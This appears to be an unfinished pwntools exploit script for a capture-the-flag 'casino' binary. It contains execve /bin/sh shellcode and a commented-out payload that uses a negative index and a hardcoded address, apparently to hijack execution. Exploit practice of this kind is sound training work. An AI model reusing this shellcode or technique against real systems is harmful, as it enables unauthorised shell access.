from pwn import *
p = process("./casino")
for i in range(2):
    p.recvline()
context.arch = 'x86_64'
asmb = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
'''
payload = 'a' * 24 + asmb + '\n' + '50' + '\n' +  \
    '1' + '\n' + \
    '2' + '\n' + \
    '3' + '\n' + \
    '4' + '\n' + \
    '5' + '\n' + \
    '6' + '\n' + \
    '1' + '\n' + \
    '-38' + '\n' + \
    '6299696' + '\n' \
    '1' + '\n' + \
    '2' + '\n' + \
    '3' + '\n' + \
    '4' + '\n' + \
    '5' + '\n' + \
    '6' + '\n' + \
    '1' + '\n' + \
    '-38' + '\n' + \
    '6299696' + '\n'
'''
test = 'aaa' + '\n' + '50' + '\n' + '1'
p.send(test)
p.recvline()